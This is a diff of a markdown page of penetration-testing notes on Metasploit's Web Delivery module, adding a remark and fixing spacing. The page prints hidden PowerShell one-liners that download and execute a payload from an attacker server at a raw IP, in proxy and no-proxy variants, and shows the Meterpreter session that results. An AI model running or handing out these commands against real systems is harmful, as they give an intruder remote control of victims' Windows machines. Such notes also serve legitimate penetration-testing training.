@@ -1,5 +1,7 @@
 ## Metasploit Web Delivery
 
+\(lazy version of uploading php-reverse-shell.php from pentest monkey\)
+
 [Metasploit Web Delivery](https://www.offensive-security.com/metasploit-unleashed/web-delivery/)
 
 Metasploit’s Web Delivery Script is a versatile module that creates a server on the attacking machine which hosts a payload. When the victim connects to the attacking server, the payload will be executed on the victim machine. This module has a powershell method which generates a string which is needed to be executed on remote windows machine.
@@ -34,26 +36,24 @@ msf exploit(web_delivery) > [*] Using URL: http://0.0.0.0:8080/uMOKs6wtlYL
 powershell.exe -nop -w hidden -c $X=new-object net.webclient;$X.proxy=[Net.WebRequest]::GetSystemWebProxy();$X.Proxy.Credentials=[Net.CredentialCache]::DefaultCredentials;IEX $X.downloadstring('http://14.97.131.138:8080/uMOKs6wtlYL');
 ```
 
- When the following command \(when there is no proxy\)
+When the following command \(when there is no proxy\)
 
 ```
 powershell.exe -nop -w hidden -c $X=new-object net.webclient;IEX $X.downloadstring('http://14.97.131.138:8080/uMOKs6wtlYL');
 ```
 
- or \(when there is proxy\)
+or \(when there is proxy\)
 
 ```
 powershell.exe -nop -w hidden -c $X=new-object net.webclient;$X.proxy=[Net.WebRequest]::GetSystemWebProxy();$X.Proxy.Credentials=[Net.CredentialCache]::DefaultCredentials;IEX $X.downloadstring('http://14.97.131.138:8080/uMOKs6wtlYL');
 ```
 
- is executed on the windows remote machine, we should get a meterpreter.
+is executed on the windows remote machine, we should get a meterpreter.
 
 ```
 Delivery web_delivery payload
 meterprerter>
 ```
-
-
 
 
 
